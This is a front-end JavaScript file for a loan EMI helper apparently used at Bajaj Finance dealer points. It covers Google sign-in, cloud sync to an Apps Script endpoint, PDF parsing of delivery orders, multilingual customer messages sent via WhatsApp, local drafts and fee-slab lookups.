/* === TOAST NOTIFICATION FUNCTION === */
let toastTimeout;
function showToast(message, type = 'success') {
    const toast = document.getElementById("toastNotification");
    if (!toast) return;
    toast.className = "toast-notification show " + type;
    toast.innerText = message;
    clearTimeout(toastTimeout);
    toastTimeout = setTimeout(function(){ toast.className = "toast-notification"; }, 3000);
}

/* === CUSTOM CONFIRM FUNCTION === */
function showCustomConfirm(msg, yesCallback, noCallback) {
    let confirmEl = document.getElementById('confirmMessage');
    if (!confirmEl) return;
    confirmEl.innerText = msg;
    let yesBtn = document.getElementById('confirmYesBtn');
    let noBtn = document.getElementById('confirmNoBtn');
    let newYesBtn = yesBtn.cloneNode(true);
    let newNoBtn = noBtn.cloneNode(true);
    yesBtn.replaceWith(newYesBtn);
    noBtn.replaceWith(newNoBtn);

    newYesBtn.onclick = function() { document.getElementById('customConfirmModal').style.display = 'none'; if(yesCallback) yesCallback(); };
    newNoBtn.onclick = function() { document.getElementById('customConfirmModal').style.display = 'none'; if(noCallback) noCallback(); };
    document.getElementById('customConfirmModal').style.display = 'flex';
}

/* === CUSTOM ALERT FUNCTION FOR COPY FALLBACK === */
function showCustomAlert(msg, text = null) {
    let alertEl = document.getElementById('alertMessage');
    if (!alertEl) return;
    alertEl.innerText = msg;
    let ta = document.getElementById('alertTextarea');
    if(text) { ta.value = text; ta.style.display = 'block'; } else { ta.style.display = 'none'; }
    document.getElementById('customAlertModal').style.display = 'flex';
}

/* === GOOGLE SHEETS CLOUD SYNC & SILENT AUTO-SYNC API === */
const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwWt4xbbEYWpSwtOSY1jqGJauljwPWojqfpxL4Bk2aRE8gJMpAzanAmNQ1OGNzKYHZfGg/exec";
let loggedInUserEmail = localStorage.getItem('persistent_user_email') || "";
let isSilentSyncing = false;

async function handleGoogleLogin(response) {
    try {
        const base64Url = response.credential.split('.')[1];
        const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
        const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) { return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2); }).join(''));
        const userData = JSON.parse(jsonPayload);
        loggedInUserEmail = userData.email; 
        localStorage.setItem('persistent_user_email', loggedInUserEmail);
        localStorage.setItem('persistent_user_name', userData.name);
        updateLoginUI(userData.name, true);
        await fetchCloudDataOnLogin(userData.name);
    } catch(e) { console.error("Google Login Parsing Error:", e); }
    toggleSidebar();
}

function updateLoginUI(userName, isOnline) {
    let statusBadge = document.getElementById('gitStatusBadge');
    let syncBtn = document.getElementById('syncBtn');
    if(syncBtn) syncBtn.style.display = 'flex';
    if(statusBadge) {
        if(isOnline) {
            statusBadge.innerHTML = '🟢 ' + userName.toUpperCase() + ' (CLOUD SYNC ON)';
            statusBadge.style.background = 'rgba(39, 174, 96, 0.15)';
            statusBadge.style.color = 'var(--success)';
        } else {
            statusBadge.innerHTML = '🔄 ' + userName + ' - SYNCING...';
            statusBadge.style.background = 'rgba(243, 156, 18, 0.15)';
            statusBadge.style.color = '#f39c12';
        }
    }
}

async function fetchCloudDataOnLogin(userName) {
    try {
        let res = await fetch(APPS_SCRIPT_URL + "?email=" + encodeURIComponent(loggedInUserEmail));
        let cloudData = await res.json();

        if(cloudData && cloudData.length > 0) {
            let combined = [...cloudData, ...customerQueue];
            let uniqueQueue = [];
            let seen = new Set();

            combined.forEach(c => {
                let key = c.timestamp + "_" + c.name; 
                if(!seen.has(key)) {
                    seen.add(key);
                    uniqueQueue.push(c);
                }
            });

            customerQueue = uniqueQueue;
            await saveQueueToLocal(true); 

            activeCustomerIndex = -1;
            renderCustomerQueue();
            updateUniversalActionButtons();
            showToast("✅ डेटा यशस्वीरित्या सिंक (Sync) झाला!", "success");
        } else {
            await triggerSilentCloudSync();
            showToast("✅ Local डेटा Cloud वर सिंक झाला!", "success");
        }
        updateLoginUI(userName, true);
    } catch(e) {
        console.error("Cloud Fetch Error", e);
        showToast("⚠️ Cloud सिंक करताना एरर आला. तुम्ही ऑफलाइन मोडमध्ये काम करू शकता.", "warning");
    }
}

async function forceCloudSync() {
    if(!loggedInUserEmail) { showToast("⚠️ कृपया आधी Google Sign In करा!", "error"); return; }
    let btn = document.getElementById('syncBtn'); let originalText = btn.innerHTML; btn.innerHTML = '<span>⏳</span> SYNCING...';
    await triggerSilentCloudSync();
    setTimeout(() => { btn.innerHTML = '<span>✅</span> SYNC COMPLETE'; setTimeout(() => { btn.innerHTML = originalText; }, 2000); }, 1200);
}

async function triggerSilentCloudSync() {
    if(!loggedInUserEmail || isSilentSyncing) return;
    try {
        isSilentSyncing = true;
        let compactQueue = customerQueue.map(c => { let cp = (c.products || []).map(p => { let { calculatedData, allSchemes, ...keepProduct } = p; return keepProduct; }); return { ...c, products: cp }; });
        await fetch(APPS_SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify({ email: loggedInUserEmail, queue: compactQueue }) });
    } catch(err) { console.log("⚠️ Silent Cloud Sync Failed in Background:", err); } finally { isSilentSyncing = false; }
}

if (typeof pdfjsLib !== 'undefined') {
    pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.16.105/pdf.worker.min.js';
}

function toggleSidebar() { document.getElementById('appSidebar').classList.toggle('open'); document.getElementById('sidebarOverlay').classList.toggle('show'); }
function openCustomerMessageModal() { document.getElementById('customerMessageGenModal').style.display = 'flex'; calculateDates(); updateDraftBadgeCount(); }
function closeCustomerMessageModal() { document.getElementById('customerMessageGenModal').style.display = 'none'; }

let pdfInputEl = document.getElementById('pdfInput');
if (pdfInputEl) {
    pdfInputEl.addEventListener('change', async function(e) {
        const file = e.target.files[0]; if (!file) return;
        let statusEl = document.getElementById('pdfStatus'); statusEl.style.color = 'var(--primary)'; statusEl.innerText = '⏳ Reading PDF data, please wait...';
        const fileReader = new FileReader();
        fileReader.onload = async function() {
            const typedarray = new Uint8Array(this.result);
            try {
                const pdf = await pdfjsLib.getDocument(typedarray).promise; let fullText = "";
                for (let i = 1; i <= pdf.numPages; i++) { const page = await pdf.getPage(i); const textContent = await page.getTextContent(); fullText += " " + textContent.items.map(item => item.str).join(" "); }
                parsePDFText(fullText); statusEl.style.color = 'var(--success)'; statusEl.innerText = '✔ PDF data extracted successfully!';
            } catch (error) { statusEl.style.color = 'var(--danger)'; statusEl.innerText = '⚠️ Error reading PDF. Please verify details manually.'; }
        };
        fileReader.readAsArrayBuffer(file);
    });
}

function parsePDFText(text) {
    const dealerMatch = text.match(/Dear\s+(.*?)\s*Customer ID:/i);
    if (dealerMatch) { let rawDealer = dealerMatch[1].replace(/Bajaj Finance Limited/gi, '').replace(/DELIVERY ORDER/gi, '').trim(); let parts = rawDealer.split('#').map(p => p.trim()).filter(p => p !== ''); document.getElementById('msgShopName').value = parts.slice(0, 2).join(' - ') || rawDealer; }
    const assetMatch = text.match(/Asset Category\s*(?:\|\s*)*([A-Z0-9\(\)\-\s]+?)\s*(?:\||\s*OEM)/i); if (assetMatch) document.getElementById('msgAssetCategory').value = assetMatch[1].trim();
    const nameMatch = text.match(/application of Mr\/Miss\/Mrs\.\s*([A-Za-z\s]+?)\s*has been approved/i); if (nameMatch) document.getElementById('msgCustName').value = nameMatch[1].trim();
    const mobileMatch = text.match(/Mobile Number:\s*(\d{10})/i); if (mobileMatch) document.getElementById('msgCustMobile').value = mobileMatch[1];
    const emiMatch = text.match(/Total EMI\s*["',\s]*([\d,]+)/i); if (emiMatch) document.getElementById('msgCustEMI').value = emiMatch[1].replace(/,/g, '');
    const tenureMatch = text.match(/Scheme Code.*?\((\d+)\s*\/\s*(\d+)\)/i) || text.match(/\((\d+)\s*\/\s*(\d+)\)/);
    if (tenureMatch) { let grossTenure = parseInt(tenureMatch[1], 10) || 0; let advanceEmi = parseInt(tenureMatch[2], 10) || 0; let netTenure = grossTenure - advanceEmi; document.getElementById('msgCustTenure').value = netTenure > 0 ? netTenure : grossTenure; }
    const dateMatch = text.match(/Date:\s*(\d{2})\/(\d{2})\/(\d{4})/i); if (dateMatch) { document.getElementById('msgLoanDate').value = `${dateMatch[3]}-${dateMatch[2]}-${dateMatch[1]}`; }
    calculateDates();
}

function calculateDates() {
    const loanDateVal = document.getElementById('msgLoanDate').value; const tenure = parseInt(document.getElementById('msgCustTenure').value) || 0; const lang = document.getElementById('msgLang').value;
    if (!loanDateVal) { document.getElementById('msgStartDate').value = ''; document.getElementById('msgEndDate').value = ''; generateMessage(); return; }
    const dateParts = loanDateVal.split('-'); let year = parseInt(dateParts[0]); let month = parseInt(dateParts[1]) - 1; let day = parseInt(dateParts[2]);
    let startMonth = month + 1; let startYear = year; if (day >= 24) { startMonth = month + 2; }
    let startDateObj = new Date(startYear, startMonth, 2); let endDateObj = new Date(startYear, startMonth + tenure - 1, 2);
    document.getElementById('msgStartDate').value = formatDate(startDateObj, lang); document.getElementById('msgEndDate').value = formatDate(endDateObj, lang); generateMessage();
}

function formatDate(dateObj, lang) {
    const mrMonths = ["जानेवारी", "फेब्रुवारी", "मार्च", "एप्रिल", "मे", "जून", "जुलै", "ऑगस्ट", "सप्टेंबर", "ऑक्टोबर", "नोव्हेंबर", "डिसेंबर"];
    const hiMonths = ["जनवरी", "फरवरी", "मार्च", "अप्रैल", "मई", "जून", "जुलाई", "अगस्त", "सितंबर", "अक्टूबर", "नवंबर", "दिसंबर"];
    const enMonths = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
    const day = String(dateObj.getDate()).padStart(2, '0'); const year = dateObj.getFullYear();
    if (lang === 'mr') return `०२ ${mrMonths[dateObj.getMonth()]} ${year}`; if (lang === 'hi') return `${day} ${hiMonths[dateObj.getMonth()]} ${year}`; return `${day} ${enMonths[dateObj.getMonth()]} ${year}`;
}

function generateMessage() {
    const shop = document.getElementById('msgShopName').value || ''; const asset = document.getElementById('msgAssetCategory').value || '';
    const name = document.getElementById('msgCustName').value || ''; const emi = document.getElementById('msgCustEMI').value || '0';
    const tenure = document.getElementById('msgCustTenure').value || '0'; const startDate = document.getElementById('msgStartDate').value || '-';
    const endDate = document.getElementById('msgEndDate').value || '-'; const lang = document.getElementById('msgLang').value;
    let msg = "";
    if (lang === 'mr') {
        msg = `सस्नेह नमस्कार, ${name}! 🙏\n\nबजाज फायनान्समध्ये आपले स्वागत आहे. आपण खरेदी केलेल्या वस्तूच्या कर्जाची (Loan) सविस्तर माहिती खालीलप्रमाणे आहे:\n\n🏬 दुकानाचे नाव (Dealer/Shop): ${shop}\n📱 वस्तूचा प्रकार (Asset): ${asset}\n📌 मासिक हप्ता (EMI): ₹${emi}/-\n📌 एकूण हप्ते (Months): ${tenure} महिने\n📅 पहिला हप्ता सुरू होण्याची तारीख: ${startDate}\n📅 शेवटचा हप्ता संपण्याची तारीख: ${endDate}\n\n⚠️ बजाज फायनान्सचे नियम व अटी:\n१) आपण घेतलेल्या वस्तूचा हप्ता दर महिन्याच्या २ तारखेला आपण दिलेल्या बँक खात्यातून (Account) कट होतो.\n२) जर कर्ज प्रक्रिया (Finance) महिन्याच्या २३ व्या तारखेपर्यंत पूर्ण झाली असेल, तर पहिला हप्ता पुढील महिन्याच्या २ तारखेला सुरू होतो.\n३) आपण ECS / NACH फॉर्मवर केलेली सही आपल्या बँकेमार्फत तपासली जाते.\n४) जर बँकेला सहीमध्ये काही तफावत (फरक) आढळल्यास, आपल्याला त्याबाबत SMS किंवा Call मार्फत पूर्वकल्पना दिली जाते.\n५) अशा वेळी, आपल्याला बजाज फायनान्सच्या कार्यालयात जाऊन योग्य सहीची पूर्तता करणे आवश्यक असते.\n६) सही न जुळल्यास बँक खात्यातून हप्ता कट होत नाही आणि बँकेच्या नियमानुसार आपल्याला 'बाऊन्स चार्ज' (दंड) आकारला जातो. हे शुल्क थेट बँकेकडे जमा होते, बजाज फायनान्सकडे नाही. या प्रक्रियेत बजाज फायनान्सचे कर्मचारी जबाबदार नसतात, याची कृपया सर्व ग्राहकांनी नोंद घ्यावी.\n७) हप्ता बाऊन्स झाल्यास बजाज फायनान्सकडून ₹५००/- बाऊन्स शुल्क (Penalty) आकारले जाते. तसेच, थकीत हप्ता जमा होईपर्यंत दररोज विलंब शुल्क (Late Fees) वाढत जाते.\n८) आपल्या बँक खात्यामध्ये लागणारी किमान शिल्लक (Minimum Balance) आणि हप्त्याची रक्कम, हप्त्याच्या तारखेच्या किमान २ दिवस आधी जमा ठेवावी.\n९) हप्ता बँक खात्यातून कट झाला की नाही हे पाहण्यासाठी मोबाईलमध्ये 'Bajaj Finserv' ॲप तपासावे. हप्ता जमा झाल्यावर आपल्या बँक खात्यात, बँक ॲपमध्ये किंवा पासबुकवर त्याची त्वरित नोंद होते व बँकेकडून SMS देखील प्राप्त होतो.\n१०) बजाज फायनान्स कार्यालय: आदिनाथ पॅराडाईज, हॉटेल शालिमारजवळ, मजगाव रोड, रत्नागिरी.\n११) महत्त्वाची सेवा माहिती: तुमच्या नोंदणीकृत मोबाईल नंबरवरून 8698010101 या नंबरवर कॉल करून तुम्ही खालील माहिती मिळवू शकता (मानक कॉल शुल्क लागू)\n१२) मुदतीपूर्वी कर्ज बंद (Loan Foreclosure) करायचे असल्यास, पुढील हप्त्याच्या किमान १० दिवस आधी बजाज फायनान्स कार्यालयात किंवा ॲपद्वारे उर्वरित रक्कम भरून कर्ज बंद करता येते.\n\nकाही अडचण असल्यास नक्की संपर्क करा. धन्यवाद! ✨`;
    } else if (lang === 'hi') {
        msg = `नमस्ते, ${name}! 🙏\n\nबजाज फाइनेंस में स्वागत है। आपके द्वारा खरीदे गए उत्पाद के लोन (Loan) का विवरण नीचे दिया गया है:\n\n🏬 डीलर / दुकान का नाम (Dealer/Shop): ${shop}\n📱 उत्पाद का प्रकार (Asset): ${asset}\n📌 मासिक किस्त (EMI): ₹${emi}/-\n📌 कुल किस्तें (Months): ${tenure} महीने\n📅 पहली किस्त शुरू होने की तारीख: ${startDate}\n📅 अंतिम किस्त समाप्त होने की तारीख: ${endDate}\n\n⚠️ बजाज फाइनेंस के नियम व शर्तें:\n१) आपके उत्पाद की किस्त हर महीने की 2 तारीख को आपके दिए गए बैंक खाते से कटती है।\n२) यदि लोन प्रक्रिया महीने की 23 तारीख तक पूरी हो जाती है, तो पहली किस्त अगले महीने की 2 तारीख से शुरू होती है।\n३) ECS / NACH फॉर्म पर आपके द्वारा किए गए हस्ताक्षर आपके बैंक द्वारा जांचे जाते हैं।\n४) यदि बैंक को हस्ताक्षर में कोई अंतर मिलता है, तो आपको SMS या Call के माध्यम से सूचित किया जाता है।\n५) ऐसी स्थिति में, आपको बजाज फाइनेंस कार्यालय जाकर सही हस्ताक्षर की प्रक्रिया पूरी करनी होगी।\n६) हस्ताक्षर गलत होने पर बैंक खाते से किस्त नहीं कटती है और बैंक के नियमानुसार बाउंस चार्ज (जुर्माना) लगाया जाता है। यह शुल्क सीधे बैंक के खाते में जाता है, बजाज फाइनेंस के नहीं। इस प्रक्रिया में बजाज फाइनेंस के कर्मचारी जिम्मेदार नहीं होते हैं, कृपया सभी ग्राहक ध्यान दें।\n७) किस्त बाउंस होने पर बजाज फाइनेंस की ओर से ₹500/- बाउंस शुल्क (Penalty) लगाया जाता है। साथ ही, बकाया किस्त जमा होने तक प्रतिदिन विलंब शुल्क (Late Fees) बढ़ता जाता है।\n८) अपने बैंक खाते में आवश्यक न्यूनतम राशि (Minimum Balance) के अलावा किस्त की राशि नियत तारीख से कम से कम 2 दिन पहले जमा रखें।\n९) किस्त कटी या नहीं, जानने के लिए अपने मोबाइल में 'Bajaj Finserv' ऐप चेक करें। किस्त प्राप्त होने पर आपके बैंक खाते या पासबुक में तुरंत दर्ज हो जाती है और बैंक SMS द्वारा भी सूचित करता है।\n१०) बजाज फाइनेंस कार्यालय: आदिनाथ पैराडाइज, होटल शालीमार के पास, मजगांव रोड, रत्नागिरी।\n११) महत्वपूर्ण सेवा जानकारी: अपने पंजीकृत मोबाइल नंबर से 8698010101 पर कॉल करके आप निम्नलिखित जानकारी प्राप्त कर सकते हैं (मानक कॉल शुल्क लागू)\n१२) समय से पहले लोन बंद (Foreclosure) करना चाहते हैं, तो अगली किस्त से कम से कम 10 दिन पहले बजाज फाइनेंस कार्यालय में या ऐप के माध्यम से शेष राशि का भुगतान करके लोन बंद कर सकते हैं।\n\nकिसी भी सहायता के लिए संपर्क करें। धन्यवाद! ✨`;
    } else {
        msg = `Dear ${name}, 🙏\n\nWelcome to Bajaj Finance! Here are the complete details of your recent product loan:\n\n🏬 Dealer / Shop Name: ${shop}\n📱 Asset Category: ${asset}\n📌 Monthly EMI: ₹${emi}/-\n📌 Total Tenure: ${tenure} Months\n📅 First EMI Start Date: ${startDate}\n📅 Last EMI End Date: ${endDate}\n\n⚠️ Important Bajaj Finance Terms & Conditions:\n1) Your loan EMI will be auto-debited on the 2nd of every month from your registered bank account.\n2) If the loan processing is completed on or before the 23rd of the month, the first EMI will start on the 2nd of the upcoming month.\n3) Your signature on the ECS / NACH mandate form is verified by your bank.\n4) If the bank detects any mismatch in your signature, you will be notified via SMS or Call.\n5) In such cases, you must visit the Bajaj Finance office to complete the correct signature verification formalities.\n6) If the signature mismatches, the EMI will not be debited, and your bank will levy a bounce penalty as per their rules. These charges go directly to your bank, not Bajaj Finance. Bajaj Finance staff will not be responsible for bank-levied charges.\n7) Additionally, Bajaj Finance levies a bounce penalty of ₹500/- for missed EMIs. Daily late payment charges will also accrue until the pending EMI is cleared.\n8) Please maintain the required EMI amount along with the Minimum Account Balance in your bank account at least 2 days prior to the due date.\n9) Please use the 'Bajaj Finserv' mobile app to track your EMI deductions. Once received, the credit reflects in your bank account/passbook immediately, and you will receive a confirmation SMS from your bank.\n10) Bajaj Finance Office Address: Adinath Paradise, Near Hotel Shalimar, Mazgaon Road, Ratnagiri.\n11) Important Service Information: You can obtain the following information by calling 8698010101 from your registered mobile number (standard call charges apply)\n12) If you wish to foreclose/close your loan ahead of time, please pay the outstanding amount at our office or via the app at least 10 days before your next EMI due date.\n\nPlease feel free to reach out if you have any questions. Thank you! ✨`;
    }
    document.getElementById('finalMessage').value = msg;
}

function copyMsgText() { document.getElementById('finalMessage').select(); document.execCommand('copy'); showToast('📋 Message copied to clipboard!', 'success'); }
function sendMsgWhatsApp() { const mobile = document.getElementById('msgCustMobile').value; const text = encodeURIComponent(document.getElementById('finalMessage').value); let url = `https://api.whatsapp.com/send?text=${text}`; if (mobile && mobile.length === 10) { url = `https://api.whatsapp.com/send?phone=91${mobile}&text=${text}`; } window.open(url, '_blank'); }

function updateDraftBadgeCount() { let drafts = JSON.parse(localStorage.getItem('persistent_emi_drafts') || '[]'); let badge = document.getElementById('draftBadge'); if (badge) { badge.innerText = drafts.length; if (drafts.length > 0) { badge.style.animation = "pulseGlow 1.5s infinite"; } else { badge.style.animation = "none"; } } }
function openDraftsModal() { renderEmiDrafts(); document.getElementById('draftsModal').style.display = 'flex'; }
function closeDraftsModal() { document.getElementById('draftsModal').style.display = 'none'; }

function saveEmiDraft() {
    const name = document.getElementById('msgCustName').value.trim(); const mobile = document.getElementById('msgCustMobile').value.trim(); const shop = document.getElementById('msgShopName').value.trim();
    const finalMsg = document.getElementById('finalMessage').value; const startDate = document.getElementById('msgStartDate').value; const endDate = document.getElementById('msgEndDate').value;
    if (!name) { showToast("⚠️ कृपया कस्टमरचे नाव (Name) एंटर करा!", "error"); return; }
    const draftObj = { id: Date.now(), shop: shop, asset: document.getElementById('msgAssetCategory').value, name: name, mobile: mobile, emi: document.getElementById('msgCustEMI').value, tenure: document.getElementById('msgCustTenure').value, loanDate: document.getElementById('msgLoanDate').value, startDate: startDate, endDate: endDate, lang: document.getElementById('msgLang').value, finalMessage: finalMsg, timestamp: new Date().toLocaleString() };
    let drafts = JSON.parse(localStorage.getItem('persistent_emi_drafts') || '[]'); drafts.unshift(draftObj); localStorage.setItem('persistent_emi_drafts', JSON.stringify(drafts));
    updateDraftBadgeCount(); showToast("✅ Draft Successfully Saved!", "success");
    document.getElementById('msgCustName').value = ''; document.getElementById('msgCustMobile').value = ''; document.getElementById('msgCustEMI').value = ''; document.getElementById('finalMessage').value = '';
}

function renderEmiDrafts() {
    updateDraftBadgeCount(); const draftsContainer = document.getElementById('draftsContainer'); if(!draftsContainer) return; 
    let drafts = JSON.parse(localStorage.getItem('persistent_emi_drafts') || '[]');
    if (drafts.length === 0) { draftsContainer.innerHTML = '<div style="text-align:center; color:#888; font-style:italic; padding: 20px;">एकही सेव्ह केलेला ड्राफ्ट नाही.</div>'; return; }
    draftsContainer.innerHTML = drafts.map((d, index) => `
        <div style="background:#f8f9fa; border:1px solid #ccc; border-radius:6px; padding:10px; display:flex; flex-direction:column; gap:8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
            <div onclick="toggleDraftDetails(${index})" style="display:flex; justify-content:space-between; align-items:center; cursor:pointer; user-select:none; padding-bottom: 2px;">
                <strong style="color:var(--bajaj-blue); font-size:14px;">👤 ${d.name} <span style="color:#555;">(${d.mobile || 'No Number'})</span> <span id="toggleIcon_${index}" style="color:#888; font-size:11px; margin-left:4px;">▼</span></strong>
                <span style="font-size:11px; color:#666;">${d.timestamp}</span>
            </div>
            <div id="draftDetails_${index}" style="display:none; font-size:12px; color:#444; background:#fff; padding:10px; border-radius:4px; border:1px dashed #aaa; line-height:1.6; margin-top:4px;">
                🏬 दुकानाचे नाव (Dealer/Shop): <b style="color:var(--indigo);">${d.shop || '-'}</b><br>
                📱 वस्तूचा प्रकार (Asset): <b style="color:var(--indigo);">${d.asset || '-'}</b><br>
                📌 मासिक हप्ता (EMI): <b style="color:var(--primary);">₹${d.emi || '0'}</b><br>
                📌 एकूण हप्ते (Months): <b style="color:var(--primary);">${d.tenure || '0'}</b><br>
                📅 पहिला हप्ता सुरू होण्याची तारीख: <b style="color:#d35400;">${d.startDate || '-'}</b><br>
                📅 शेवटचा हप्ता संपण्याची तारीख: <b style="color:#d35400;">${d.endDate || '-'}</b>
                <div style="display:flex; gap:6px; margin-top:10px; border-top:1px solid #eee; padding-top:10px;">
                    <button onclick="loadEmiDraft(${index})" style="flex:1; background:var(--indigo); color:white; padding:8px; border-radius:4px; border:none; cursor:pointer; font-weight:bold; font-size: 11px;">✏️ LOAD</button>
                    <button onclick="sendDraftNow(${index})" style="flex:1.2; background:#25D366; color:white; padding:8px; border-radius:4px; border:none; cursor:pointer; font-weight:bold; font-size: 11px;">💬 SEND NOW</button>
                    <button onclick="markDraftAsSent(${index})" style="flex:0.8; background:var(--danger); color:white; padding:8px; border-radius:4px; border:none; cursor:pointer; font-weight:bold; font-size: 11px;">🗑️ DELETE</button>
                </div>
            </div>
        </div>
    `).join('');
}

function toggleDraftDetails(index) { const detailsDiv = document.getElementById(`draftDetails_${index}`); const icon = document.getElementById(`toggleIcon_${index}`); if (detailsDiv.style.display === 'none') { detailsDiv.style.display = 'block'; icon.innerText = '▲'; } else { detailsDiv.style.display = 'none'; icon.innerText = '▼'; } }
function sendDraftNow(index) { let drafts = JSON.parse(localStorage.getItem('persistent_emi_drafts') || '[]'); let d = drafts[index]; if (!d) return; let mobile = d.mobile || ''; let text = encodeURIComponent(d.finalMessage || ''); if(!text) { showToast("⚠️ हा जुना ड्राफ्ट आहे. कृपया आधी 'LOAD' वर क्लिक करा आणि मग मेसेज पाठवा.", "warning"); return; } let url = `https://api.whatsapp.com/send?text=${text}`; if (mobile && mobile.length === 10) { url = `https://api.whatsapp.com/send?phone=91${mobile}&text=${text}`; } window.open(url, '_blank'); }
function loadEmiDraft(index) { let drafts = JSON.parse(localStorage.getItem('persistent_emi_drafts') || '[]'); let d = drafts[index]; if (!d) return; document.getElementById('msgShopName').value = d.shop || ''; document.getElementById('msgAssetCategory').value = d.asset || ''; document.getElementById('msgCustName').value = d.name || ''; document.getElementById('msgCustMobile').value = d.mobile || ''; document.getElementById('msgCustEMI').value = d.emi || ''; document.getElementById('msgCustTenure').value = d.tenure || ''; document.getElementById('msgLoanDate').value = d.loanDate || ''; document.getElementById('msgLang').value = d.lang || 'en'; calculateDates(); closeDraftsModal(); }

function markDraftAsSent(index) {
    showCustomConfirm("हा ड्राफ्ट लिस्ट मधून कायमचा डिलीट होईल. पुढे जायचे?", () => { let drafts = JSON.parse(localStorage.getItem('persistent_emi_drafts') || '[]'); drafts.splice(index, 1); localStorage.setItem('persistent_emi_drafts', JSON.stringify(drafts)); renderEmiDrafts(); showToast("🗑️ ड्राफ्ट डिलीट झाला!", "success"); });
}

window.isFestiveMode = false; let currentModalCategory = ""; let tempFgDealerId = ""; let tempFgDealerName = ""; let tempFgModel = ""; let tempFgBitly = ""; 

function cleanPureShopName(raw) { if(!raw) return ""; return raw.split('#')[0].split('|')[0].split('(')[0].trim().toUpperCase(); }
function parseDealerObj(d) {
    if (!d) return { code: '', name: '', city: '', bitly: '' };
    let keys = Object.keys(d); let rawName = '', code = '', city = '', bitly = '';
    for (let k of keys) { let val = String(d[k]).trim(); if (val.startsWith('http://') || val.startsWith('https://') || val.includes('bit.ly')) { bitly = val; break; } }
    let nameKey = keys.find(k => ['DEALER NAME', 'SHOP NAME', 'NAME', 'SHOP', 'DEALER'].includes(k.toUpperCase().trim())); rawName = nameKey ? String(d[nameKey]).trim() : '';
    let codeKey = keys.find(k => ['DEALERID', 'DEALER CODE', 'CODE', 'ID', 'BPES RCD', 'DEALER_ID'].includes(k.toUpperCase().trim())); code = codeKey ? String(d[codeKey]).trim() : '';
    let cityKey = keys.find(k => ['CITY', 'LOCATION', 'TOWN', 'DISTRICT'].includes(k.toUpperCase().trim())); city = cityKey ? String(d[cityKey]).trim() : '';
    if (rawName.includes('#')) { let parts = rawName.split('#'); let shopPart = parts[0].trim(); if (!city && parts.length > 1) city = parts[1].split('|')[0].replace(/\(.*?\)/g, '').trim(); if (!code && parts.length > 2) { for (let p of parts) if (/\d{5,}/.test(p)) { code = p.match(/\d{5,}/)[0]; break; } } rawName = shopPart; }
    if (bitly && !bitly.startsWith('http')) bitly = 'https://' + bitly; return { code: code || '-', name: cleanPureShopName(rawName) || 'SHOP', city: city || '', bitly: bitly };
}

function isMobileDeviceCat(cat) { if (!cat) return false; let c = String(cat).toUpperCase().replace(/\s+/g, '').trim(); return c === 'PHONE(WEB-MOBILE)' || c === 'PHONE,TABLET,SMARTWATCH' || c.includes('TABLET,SMART') || c.includes('PHONE,TABLET') || c === 'SMARTPHONES' || c === 'MOBILE'; }
function standardizeCategoryName(cat) { if (!cat) return "OTHER"; let c = String(cat).toUpperCase().trim(); let cNoSpace = c.replace(/\s+/g, ''); if (cNoSpace === 'PHONE(WEB-MOBILE)' || cNoSpace === 'PHONE,TABLET,SMARTWATCH' || cNoSpace.includes('TABLET,SMART') || cNoSpace.includes('PHONE,TABLET') || cNoSpace === 'SMARTPHONES' || cNoSpace === 'MOBILE') { return "PHONE(WEB-MOBILE)"; } if (cNoSpace === 'AIRCONDITIONERS' || cNoSpace === 'AIRCONDITIONER' || cNoSpace === 'AC') { return "AC"; } if (cNoSpace === 'BATTERIES' || cNoSpace === 'BATTERY') { return "BATTERY"; } if (cNoSpace === 'AIRCOOLERS' || cNoSpace === 'AIRCOOLER' || cNoSpace === 'COOLER') { return "AIR COOLER"; } if (cNoSpace === 'TELEVISIONS' || cNoSpace === 'TELEVISION' || cNoSpace === 'TV' || cNoSpace === 'LED' || cNoSpace === 'LEDTV') { return "LED TV"; } if (cNoSpace === 'WASHINGMACHINES' || cNoSpace === 'WASHINGMACHINE' || cNoSpace === 'WM') { return "WASHING MACHINE"; } if (cNoSpace === 'REFRIGERATORS' || cNoSpace === 'REFRIGERATOR' || cNoSpace === 'FRIDGE' || cNoSpace === 'REF') { return "REFRIGERATOR"; } if (cNoSpace === 'WATERPURIFIERS' || cNoSpace === 'WATERPURIFIER' || cNoSpace === 'RO') { return "WATER PURIFIER"; } return c; }
function getRfcSlabValue(val) { let amount = parseFloat(val) || 0; if (amount < 8000) return 0; if (amount <= 10000) return 1109; if (amount <= 15000) return 1631; if (amount <= 20000) return 2147; if (amount <= 25000) return 2695; if (amount <= 30000) return 3215; if (amount <= 35000) return 3648; if (amount <= 40000) return 4219; if (amount <= 50000) return 5720; if (amount <= 60000) return 8686; if (amount <= 100000) return 11438; if (amount <= 200000) return 16677; return 0; }
function getNonTieupPfValue(category, amount) { let cat = String(category || "").toUpperCase().replace(/\s+/g, '').trim(); let val = parseFloat(amount) || 0; if (cat.includes('DESKTOP') || cat.includes('LAPTOP')) { return 699; } if (cat === 'PHONE(WEB-MOBILE)' || cat.includes('PHONE') || cat.includes('TABLET') || cat.includes('WATCH') || cat.includes('PRINTER') || cat.includes('HEADPHONE') || cat === 'SMARTPHONES' || cat === 'MOBILE') { if (val <= 30000) return 499; if (val <= 50000) return 599; return 699; } return null; }

const GITHUB_RAW_URL = "https://raw.githubusercontent.com/luckyjathar/CALCULATOR/main/master_data.xlsx"; const GITHUB_API_URL = "https://api.github.com/repos/luckyjathar/CALCULATOR/commits?path=master_data.xlsx&page=1&per_page=1";
const DB_NAME = "PersistentPortalDB"; const DB_VERSION = 2; const STORE_NAME = "dataStore"; let dbInstance;

function initDB() { return new Promise((resolve, reject) => { let request = indexedDB.open(DB_NAME, DB_VERSION); request.onupgradeneeded = function(e) { let db = e.target.result; if (!db.objectStoreNames.contains(STORE_NAME)) { db.createObjectStore(STORE_NAME); } }; request.onsuccess = function(e) { dbInstance = e.target.result; resolve(dbInstance); }; request.onerror = function(e) { reject(e); }; }); }
